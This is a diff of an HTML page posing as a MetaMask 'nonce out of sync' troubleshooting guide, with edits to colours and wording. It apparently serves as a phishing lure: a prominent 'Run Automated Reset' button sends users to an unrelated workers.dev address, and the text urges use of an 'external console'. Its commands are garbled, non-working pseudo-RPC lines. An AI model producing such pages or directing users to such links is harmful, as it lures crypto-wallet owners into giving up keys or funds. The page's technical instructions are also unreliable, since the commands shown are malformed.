@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #1a1a24;
+        font-family: BlinkMacSystemFont;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff7b2c; }
+    a { color: #ff9455; }
     .btn {
-        background: #cf6679;
+        background: #00adb5;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,28 +41,27 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>Users experience a "nonce out of sync" error when attempting to send transactions using MetaMask on the Ethereum network, resulting in failed or stuck transactions.</li>
+<li>Users encounter an error message stating "MetaMask nonce out of sync" when attempting to send a transaction or interact with a smart contract on the Ethereum (ETH) network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the expected nonce (transaction count) stored in MetaMask and the actual nonce on the Ethereum blockchain, often caused by concurrent transactions or wallet resets.</li>
+<li>The error occurs due to a mismatch between the expected transaction nonce in MetaMask and the actual nonce on the Ethereum blockchain. This can happen when a transaction is sent but not confirmed, causing the nonce to become desynchronized.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the MetaMask account nonce to match the on-chain value:</li>
-<li>Check the current account nonce on Etherscan or a similar blockchain explorer</li>
-<li>Update the MetaMask account settings to reflect the correct nonce</li>
-<li>Use the following command to verify the nonce:</li>
+<li>Reset MetaMask account: Try resetting the MetaMask account to resynchronize the nonce.</li>
+<li>Update transaction nonce: Manually update the transaction nonce to match the current nonce on the blockchain.</li>
+<li>Force transaction resend: Forcefully resend the transaction with the correct nonce using the following command:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>eth_getTransactionCount<span class="w"> </span>&lt;account_address&gt;<span class="w"> </span>--json
+<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="w"> </span><span class="s1">&#39;{&#39;</span>from<span class="s1">&#39;: &#39;</span>0x...<span class="s1">&#39;,&#39;</span>nonce<span class="s1">&#39;: &#39;</span>0x...<span class="s1">&#39;,&#39;</span>gasPrice<span class="s1">&#39;: &#39;</span>0x...<span class="s1">&#39;}&#39;</span>
 </code></pre></div>
 
-<p>For a more seamless experience, consider utilizing an external console to execute complex commands.</p>
+<p>Consider utilizing an external console for more advanced troubleshooting and transaction management.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask wallet installed and configured</li>
-<li>Basic understanding of Ethereum transactions and nonces</li>
-<li>Access to Etherscan or a similar blockchain explorer</li>
+<li>MetaMask installed and configured</li>
+<li>Ethereum network selected</li>
+<li>Sufficient ETH balance for transaction fees</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
